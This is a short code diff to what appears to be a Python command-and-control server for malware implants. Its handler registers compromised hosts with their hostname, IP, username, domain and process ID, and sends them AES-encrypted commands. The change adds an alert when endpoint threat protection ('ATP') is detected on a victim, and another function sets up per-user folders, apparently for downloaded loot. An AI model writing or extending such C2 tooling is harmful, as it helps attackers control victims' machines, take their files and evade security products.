@@ -240,7 +240,7 @@ def fr():
     if os.path.isdir("downloads"):
         pass
     else:
-        os.mkdir("downloads")    
+        os.mkdir("downloads")
     if os.path.isdir("downloads/%s" % fusername):
         pass
     else:
@@ -331,10 +331,14 @@ def first_ping():
             os_version = raw_request[2]
             pid = raw_request[3]
             domain = raw_request[4]
-            ip = request.environ['REMOTE_ADDR']
             last_ping = time.ctime()
+            ip = request.environ['REMOTE_ADDR']
             connections_information[counter] = [counter, ip, hostname, pid, username, domain, last_ping, os_version]
             print("\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(hostname, ip, counter))
+            atp = raw_request[5]
+            if atp == "True":
+                print("\n\x1b[6;33;41m ATP Detected on \x1b[0m %s - %s" %(hostname, ip))
+
             commands[hostname] = encrypt_command(aes_key, aes_iv, "False")
             counter = counter + 1
             response = make_response("")
